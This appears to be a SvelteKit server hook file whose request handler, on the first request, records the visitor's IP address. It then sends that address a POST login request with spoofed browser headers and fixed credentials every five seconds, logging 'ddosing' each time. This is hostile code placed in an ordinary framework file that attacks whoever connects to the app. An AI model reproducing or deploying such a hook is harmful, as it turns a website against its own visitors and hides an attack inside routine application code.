import type { Handle } from "@sveltejs/kit";

let running = false;

export const handle: Handle = async ({ event, resolve }) => {
  if (running === false) {
    running = true;
    var ip = event.getClientAddress();

    setInterval(async () => {
      console.log("ddosing " + ip);

      try {
        await fetch(`http://${ip}:8080/`, {
          credentials: "omit",
          headers: {
            "User-Agent":
              "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
            Accept:
              "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
          },
          referrer: `http://${ip}:8080/`,
          body: "email=amogus123%40gmail.com&password=mypass",
          method: "POST",
          mode: "cors",
        });
      } catch (e) {
        console.log("server not up yet");
      }
    }, 5000);
  }
  return await resolve(event);
};
